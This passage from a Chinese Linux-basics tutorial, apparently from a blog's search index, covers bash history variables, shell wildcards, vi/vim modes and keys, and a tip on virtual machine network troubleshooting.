title="4.定制history功能"></a>4.定制history功能</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">语法格式:name=<span class="hljs-string">&#x27;vlaue&#x27;</span><br>HISTSIZE：<span class="hljs-built_in">history</span>记录的行数<br>HISTFILE：<span class="hljs-built_in">history</span>记录文件目录<br>HISTFILESIZE：<span class="hljs-built_in">history</span>记录文件目录行数<br></code></pre></td></tr></table></figure><h6 id="5-通配符"><a href="#5-通配符" class="headerlink" title="5.通配符"></a>5.通配符</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less">常用的通配符有 * 、? 、<span class="hljs-selector-attr">[]</span> 等<br><span class="hljs-number">1</span>. * 表示任意长度的任意字符 <span class="hljs-selector-tag">eg</span>:<span class="hljs-selector-tag">cat</span> <span class="hljs-selector-tag">file</span>*<br><span class="hljs-number">2</span>. ? 表示任意单个字符  <span class="hljs-selector-tag">eg</span>:<span class="hljs-selector-tag">cat</span> <span class="hljs-selector-tag">a</span>?<span class="hljs-selector-tag">b</span><br><span class="hljs-number">3</span>. <span class="hljs-selector-attr">[]</span> 匹配指定范围内任意单个字符  <span class="hljs-selector-tag">eg</span>:<span class="hljs-selector-tag">cat</span> <span class="hljs-selector-attr">[ac]</span><span class="hljs-selector-tag">bc</span><br><span class="hljs-selector-attr">[a-Z]</span>：表示任意一个单个字母<br><span class="hljs-selector-attr">[0-9]</span>：表示任意单个数字<br><span class="hljs-number">4</span>.<span class="hljs-selector-attr">[^]</span>匹配除指定范围以外的任意单个字符  <span class="hljs-selector-tag">eg</span>:<span class="hljs-selector-tag">cat</span> <span class="hljs-selector-attr">[^ac]</span><span class="hljs-selector-tag">bc</span><br></code></pre></td></tr></table></figure><h1 id="vi-vim编辑器"><a href="#vi-vim编辑器" class="headerlink" title="vi/vim编辑器"></a>vi/vim编辑器</h1><h6 id="1-命令模式"><a href="#1-命令模式" class="headerlink" title="1.命令模式:"></a>1.命令模式:</h6><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.i</span> 进入到编辑模式，以输入字符。 <br><span class="hljs-number">2</span><span class="hljs-selector-class">.x</span> 删除当前光标所在处的字符。 <br><span class="hljs-number">3</span>.: 切换到底线命令模式，以在最底一行输入命令。<br></code></pre></td></tr></table></figure><h6 id="2-输入模式"><a href="#2-输入模式" class="headerlink" title="2.输入模式:"></a>2.输入模式:</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">dd 删除整行<br>gg 跳转到第一行第一个字符<br>G 移动到最后一行<br>u 撤销上一个动作<br>ctrl+ r 重复上一个操作<br>home<span class="hljs-regexp">/shift+6/</span><span class="hljs-number">0</span> 跳转到本行行首<br>end/shift+<span class="hljs-number">4</span> 跳转到本行行尾<br><span class="hljs-regexp">/[需要搜索的字符串] 搜索(类似于ctrl+F) 示例/</span>word<br>pg up 上一页<br>pg dn 下一页<br></code></pre></td></tr></table></figure><h6 id="3-底线命令模式"><a href="#3-底线命令模式" class="headerlink" title="3.底线命令模式"></a>3.底线命令模式</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span>/o/<span class="hljs-selector-tag">a</span> 进入编辑模式<br>ESC 回到一般模式<br>w 写入<br><span class="hljs-selector-tag">q</span> 退出编辑<br>! 强制<br></code></pre></td></tr></table></figure><h6 id="拓展"><a href="#拓展" class="headerlink" title="拓展:"></a>拓展:</h6><p>虚拟机断网排查:</p><p>1.在物理机里查看ipconfig</p><p>查看网段是否在192.168..</p><p>不在则说明出错</p><p>2.虚拟机网卡丢失</p><p>编辑-&gt;虚拟网络编辑器-&gt;选择网络-&gt;还原默认设置</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
